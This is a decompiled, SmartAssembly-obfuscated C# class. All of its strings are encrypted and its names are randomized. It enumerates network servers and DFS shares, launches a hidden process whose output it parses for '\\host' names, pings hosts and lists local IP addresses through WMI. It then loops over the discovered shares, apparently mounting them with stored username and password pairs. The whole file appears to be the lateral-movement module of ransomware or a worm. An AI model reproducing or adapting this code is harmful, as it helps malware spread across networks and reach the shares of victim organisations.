using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace fTOyYuFiHboGKe;

internal sealed class RZVoGTpoteQpz
{
	public sealed class VFXYtYoyZTO
	{
		private string _003CServerName_003Ek__BackingField;

		public string ServerName
		{
			get
			{
				return _003CServerName_003Ek__BackingField;
			}
			set
			{
				_003CServerName_003Ek__BackingField = value;
			}
		}
	}

	public enum oElrKszIqLXflk
	{
		CbNbvqvuUjqKgHy = 1,
		AvobvwqaLgrWUSt,
		xPMgOzbmkZNuf,
		EDosYrMABW,
		ixaKerexcLkm
	}

	public enum vnPWWDFgqbzqS
	{
		XgpSnGaYrp,
		BjWPihPtlhDkR,
		ffhWmQzduaUHAIz,
		upMBZxUsjfuAD
	}

	public enum HbSndXiTgjenyC
	{
		UYEfkUvmkCXNu = 1,
		TYPlTgUvSfewvZi = 2,
		FOIPhKezJTIh = 4,
		StepqvPoFFSh = 8,
		rRUuSnrlFRk = 16,
		cZWsBkWBYEZvATVt = 19
	}

	public enum EifaSyzawyyOa
	{
		WNMzpRfqOOpAa,
		bHVrmUPbaBTi,
		vDvEmdgRJK,
		NDQdWyvHfH,
		asCzGjbDIfqe,
		LGEeWxHAEKhw,
		UWJpvtlRfAmlbs,
		TyRlaEvWfQQ,
		kKFhqFaXhG,
		orKaAJHMoWlsQ,
		laDLTgwtrhsr,
		fLCMkLKTYNOH
	}

	public sealed class PvqErlzcuLBs : IEnumerable
	{
		private enum JFqoBBoylzbxis
		{
			VlxPTzvRBSTHrXQ = 0,
			NGDvVWDACVEQPHNL = 259
		}

		[StructLayout(LayoutKind.Sequential)]
		private sealed class KXhALwCLhyLuc
		{
			public oElrKszIqLXflk ofGjCCcOrWMptGC;

			public vnPWWDFgqbzqS KSbSnBMUXoLP;

			public EifaSyzawyyOa dEeUSHQCZN;

			public HbSndXiTgjenyC pnXDaTUVsBZWY;

			public string fMAkzhinErMoI;

			public string SUqYAfQotfbGIQg;

			public string YxonIxgjTv;

			public string xduMqsLaPJUg;
		}

		private ArrayList isxkmJEzcfHZbm = new ArrayList();

		[DllImport("Mpr.dll")]
		private static extern JFqoBBoylzbxis WNetOpenEnumA(oElrKszIqLXflk dwScope, vnPWWDFgqbzqS dwType, HbSndXiTgjenyC dwUsage, KXhALwCLhyLuc p, out IntPtr lphEnum);

		[DllImport("Mpr.dll")]
		private static extern JFqoBBoylzbxis WNetCloseEnum(IntPtr intptr_0);

		[DllImport("Mpr.dll")]
		private static extern JFqoBBoylzbxis WNetEnumResourceA(IntPtr intptr_0, ref uint uint_0, IntPtr intptr_1, ref uint uint_1);

		private void EnumerateServers(KXhALwCLhyLuc kxhALwCLhyLuc_0, oElrKszIqLXflk oElrKszIqLXflk_0, vnPWWDFgqbzqS vnPWWDFgqbzqS_0, HbSndXiTgjenyC hbSndXiTgjenyC_0, EifaSyzawyyOa eifaSyzawyyOa_0)
		{
			uint uint_ = 16384u;
			IntPtr intPtr = Marshal.AllocHGlobal(16384);
			IntPtr lphEnum = IntPtr.Zero;
			uint uint_2 = 1u;
			if (WNetOpenEnumA(oElrKszIqLXflk_0, vnPWWDFgqbzqS_0, hbSndXiTgjenyC_0, kxhALwCLhyLuc_0, out lphEnum) == JFqoBBoylzbxis.VlxPTzvRBSTHrXQ)
			{
				JFqoBBoylzbxis jFqoBBoylzbxis;
				do
				{
					jFqoBBoylzbxis = WNetEnumResourceA(lphEnum, ref uint_2, intPtr, ref uint_);
					switch (jFqoBBoylzbxis)
					{
					case JFqoBBoylzbxis.NGDvVWDACVEQPHNL:
						continue;
					case JFqoBBoylzbxis.VlxPTzvRBSTHrXQ:
						Marshal.PtrToStructure(intPtr, kxhALwCLhyLuc_0);
						if (kxhALwCLhyLuc_0.dEeUSHQCZN == eifaSyzawyyOa_0)
						{
							isxkmJEzcfHZbm.Add(kxhALwCLhyLuc_0.SUqYAfQotfbGIQg);
						}
						if ((kxhALwCLhyLuc_0.pnXDaTUVsBZWY & HbSndXiTgjenyC.TYPlTgUvSfewvZi) == HbSndXiTgjenyC.TYPlTgUvSfewvZi)
						{
							EnumerateServers(kxhALwCLhyLuc_0, oElrKszIqLXflk_0, vnPWWDFgqbzqS_0, hbSndXiTgjenyC_0, eifaSyzawyyOa_0);
						}
						continue;
					}
					break;
				}
				while (jFqoBBoylzbxis != JFqoBBoylzbxis.NGDvVWDACVEQPHNL);
				WNetCloseEnum(lphEnum);
			}
			Marshal.FreeHGlobal(intPtr);
		}

		public PvqErlzcuLBs(oElrKszIqLXflk oElrKszIqLXflk_0, vnPWWDFgqbzqS vnPWWDFgqbzqS_0, HbSndXiTgjenyC hbSndXiTgjenyC_0, EifaSyzawyyOa eifaSyzawyyOa_0)
		{
			KXhALwCLhyLuc kxhALwCLhyLuc_ = new KXhALwCLhyLuc();
			EnumerateServers(kxhALwCLhyLuc_, oElrKszIqLXflk_0, vnPWWDFgqbzqS_0, hbSndXiTgjenyC_0, eifaSyzawyyOa_0);
		}

		public IEnumerator GetEnumerator()
		{
			return isxkmJEzcfHZbm.GetEnumerator();
		}
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct tAQlyCXwtnhdR
	{
		[MarshalAs(UnmanagedType.LPWStr)]
		public string mjCLIbhyJKbU;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string CUtVIVQUMbBNuM;

		public uint arQfJvMcJEHa;

		public uint mLlHfEmriO;

		public IntPtr BEhbyZKmjhwdh;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct FhBuSRxjxyky
	{
		public int arQfJvMcJEHa;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string nIEuJxFdOMNNS;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string snsscmAmrxhYa;
	}

	public struct VGJCsZwPHkJ
	{
		public string jLRJjItzPkBCC;

		public string[] rYnhrIoJjFMBzeLBf;

		public VGJCsZwPHkJ(string string_0, string[] string_1)
		{
			jLRJjItzPkBCC = string_0;
			rYnhrIoJjFMBzeLBf = string_1;
		}
	}

	private sealed class YFxWOEVvcXC
	{
		public string UqRsajzGDUmJvpmyx;

		public bool _003CGetIPAddresses_003Eb__5(string string_0)
		{
			return string_0 != UqRsajzGDUmJvpmyx;
		}
	}

	public static List<string> SMMiGoXWel;

	public static string ZjWUjHdIhLELi;

	public static List<string> weCHoBiWCTZgKnEN;

	public static List<string> EuhwTzWeKNm;

	public static List<string> ouWhAtVsmsccGFF;

	[NonSerialized]
	internal static GetString getString_0;

	public static List<VFXYtYoyZTO> MuAGOodBJg()
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = getString_0(107397193);
			process.StartInfo.Arguments = getString_0(107407294);
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.RedirectStandardOutput = true;
			process.Start();
			List<VFXYtYoyZTO> list = new List<VFXYtYoyZTO>();
			while (true)
			{
				if (!process.StandardOutput.EndOfStream)
				{
					string text = process.StandardOutput.ReadLine();
					if (text == getString_0(107407309))
					{
						break;
					}
					if (text != string.Empty && text[0] == '\\' && text[1] == '\\')
					{
						StringBuilder stringBuilder = new StringBuilder();
						for (int i = 2; i < text.Length && text[i] != ' '; i++)
						{
							stringBuilder.Append(text[i]);
						}
						list.Add(new VFXYtYoyZTO
						{
							ServerName = getString_0(107397198) + stringBuilder.ToString() + getString_0(107407264)
						});
					}
					continue;
				}
				process.WaitForExit();
				process.Close();
				return list;
			}
			return null;
		}
		catch
		{
			return null;
		}
	}

	[DllImport("Netapi32.dll", CharSet = CharSet.Auto)]
	public static extern int NetDfsEnum([MarshalAs(UnmanagedType.LPWStr)] string tVqftZuRjT, int VrBgeJzUQbHqQiW, int OonJasTAbfH, out IntPtr UUkLjUqioWndLHC, [MarshalAs(UnmanagedType.I4)] out int xIQAIRnXEH, [MarshalAs(UnmanagedType.I4)] ref int fovjYmXUPjdVOmy);

	public static List<VGJCsZwPHkJ> uRPmICpLAjPIxg(string string_0)
	{
		try
		{
			List<VGJCsZwPHkJ> list = new List<VGJCsZwPHkJ>();
			IntPtr UUkLjUqioWndLHC = default(IntPtr);
			int xIQAIRnXEH = 0;
			int fovjYmXUPjdVOmy = 0;
			if (NetDfsEnum(string_0, 3, 268435455, out UUkLjUqioWndLHC, out xIQAIRnXEH, ref fovjYmXUPjdVOmy) == 0)
			{
				for (int i = 0; i < xIQAIRnXEH; i++)
				{
					tAQlyCXwtnhdR tAQlyCXwtnhdR = (tAQlyCXwtnhdR)Marshal.PtrToStructure(UUkLjUqioWndLHC + i * Marshal.SizeOf(typeof(tAQlyCXwtnhdR)), typeof(tAQlyCXwtnhdR));
					if (tAQlyCXwtnhdR.mjCLIbhyJKbU == string_0)
					{
						continue;
					}
					List<string> list2 = new List<string>();
					for (int j = 0; j < tAQlyCXwtnhdR.mLlHfEmriO; j++)
					{
						IntPtr ptr = new IntPtr(tAQlyCXwtnhdR.BEhbyZKmjhwdh.ToInt64() + j * Marshal.SizeOf(typeof(FhBuSRxjxyky)));
						FhBuSRxjxyky fhBuSRxjxyky = (FhBuSRxjxyky)Marshal.PtrToStructure(ptr, typeof(FhBuSRxjxyky));
						if (fhBuSRxjxyky.arQfJvMcJEHa == 2)
						{
							list2.Add(Path.Combine(new string[3]
							{
								getString_0(107391603),
								fhBuSRxjxyky.nIEuJxFdOMNNS,
								fhBuSRxjxyky.snsscmAmrxhYa
							}));
						}
					}
					string text = tAQlyCXwtnhdR.mjCLIbhyJKbU.Replace(string_0, getString_0(107393971));
					if (text.StartsWith(getString_0(107397198)))
					{
						text = text.Substring(1);
					}
					list.Add(new VGJCsZwPHkJ(text, list2.ToArray()));
				}
			}
			return list;
		}
		catch (Exception)
		{
			return null;
		}
	}

	public static void ceAAfjOJRaRCIelx()
	{
		bpqMdVmtaEtPaZM.NffZNIbIlwcdlddH(getString_0(107406711));
		List<VFXYtYoyZTO> list = MuAGOodBJg();
		List<VGJCsZwPHkJ> list2 = uRPmICpLAjPIxg(Environment.MachineName);
		if (list2 != null)
		{
			foreach (VGJCsZwPHkJ item in list2)
			{
				string[] rYnhrIoJjFMBzeLBf = item.rYnhrIoJjFMBzeLBf;
				foreach (string text in rYnhrIoJjFMBzeLBf)
				{
					if (text.Contains(Environment.MachineName))
					{
						continue;
					}
					try
					{
						if (bpqMdVmtaEtPaZM.sHBwSrfcnHkEPy == getString_0(107396764))
						{
							for (int j = 0; j < weCHoBiWCTZgKnEN.Count; j++)
							{
								bpqMdVmtaEtPaZM.QYoxJyabcEN(getString_0(107393152), getString_0(107393031) + text + getString_0(107393130) + weCHoBiWCTZgKnEN[j] + getString_0(107393085) + EuhwTzWeKNm[j]);
							}
						}
						else
						{
							bpqMdVmtaEtPaZM.QYoxJyabcEN(getString_0(107393152), getString_0(107393031) + text);
						}
						bpqMdVmtaEtPaZM.ndBzFjvUeNH.Add(text.Replace(getString_0(107391616), getString_0(107393971)));
					}
					catch
					{
					}
				}
			}
		}
		if (list == null)
		{
			return;
		}
		foreach (VFXYtYoyZTO item2 in list)
		{
			if (item2.ServerName.Contains(Environment.MachineName))
			{
				continue;
			}
			try
			{
				if (bpqMdVmtaEtPaZM.sHBwSrfcnHkEPy == getString_0(107396764))
				{
					for (int k = 0; k < weCHoBiWCTZgKnEN.Count; k++)
					{
						bpqMdVmtaEtPaZM.QYoxJyabcEN(getString_0(107393152), getString_0(107393031) + item2.ServerName + getString_0(107393130) + weCHoBiWCTZgKnEN[k] + getString_0(107393085) + EuhwTzWeKNm[k]);
					}
				}
				else
				{
					bpqMdVmtaEtPaZM.QYoxJyabcEN(getString_0(107393152), getString_0(107393031) + item2.ServerName);
				}
				bpqMdVmtaEtPaZM.ndBzFjvUeNH.Add(item2.ServerName.Replace(getString_0(107391616), getString_0(107393971)));
			}
			catch
			{
			}
		}
	}

	public static bool bskzVvtoqYIdv(string string_0)
	{
		bool result = false;
		Ping ping = null;
		try
		{
			using (ping = new Ping())
			{
				PingReply pingReply = ping.Send(string_0);
				result = pingReply.Status == IPStatus.Success;
				return result;
			}
		}
		catch (PingException)
		{
			return result;
		}
		finally
		{
			ping?.Dispose();
		}
	}

	public static List<string> EXmePuYKPnkV()
	{
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_001d: Expected O, but got Unknown
		//IL_0036: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		string[] array = null;
		try
		{
			ArrayList arrayList = new ArrayList();
			ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107406658));
			ManagementObjectCollection val2 = val.Get();
			ManagementObjectEnumerator enumerator = val2.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val3 = (ManagementObject)enumerator.get_Current();
					if ((bool)((ManagementBaseObject)val3).get_Item(getString_0(107406593)))
					{
						string[] array2 = (string[])((ManagementBaseObject)val3).get_Item(getString_0(107406548));
						string[] array3 = array2;
						foreach (string value in array3)
						{
							arrayList.Add(value);
						}
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			if (arrayList.Count > 0)
			{
				array = new string[arrayList.Count];
				arrayList.CopyTo(array);
			}
			else
			{
				array = new string[0];
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (array == null)
			{
				return null;
			}
			string[] array4 = array;
			for (int j = 0; j < array4.Length; j++)
			{
				YFxWOEVvcXC CS_0024_003C_003E8__locals0 = new YFxWOEVvcXC();
				CS_0024_003C_003E8__locals0.UqRsajzGDUmJvpmyx = array4[j];
				if (CS_0024_003C_003E8__locals0.UqRsajzGDUmJvpmyx.Contains(getString_0(107406567)))
				{
					array = array.Where((string string_0) => string_0 != CS_0024_003C_003E8__locals0.UqRsajzGDUmJvpmyx).ToArray();
				}
			}
			return array.ToList();
		}
		catch
		{
			return null;
		}
	}

	static RZVoGTpoteQpz()
	{
		Strings.CreateGetStringDelegate(typeof(RZVoGTpoteQpz));
		SMMiGoXWel = new List<string>();
		ZjWUjHdIhLELi = getString_0(107393971);
		weCHoBiWCTZgKnEN = new List<string>();
		EuhwTzWeKNm = new List<string>();
		ouWhAtVsmsccGFF = new List<string>();
	}
}
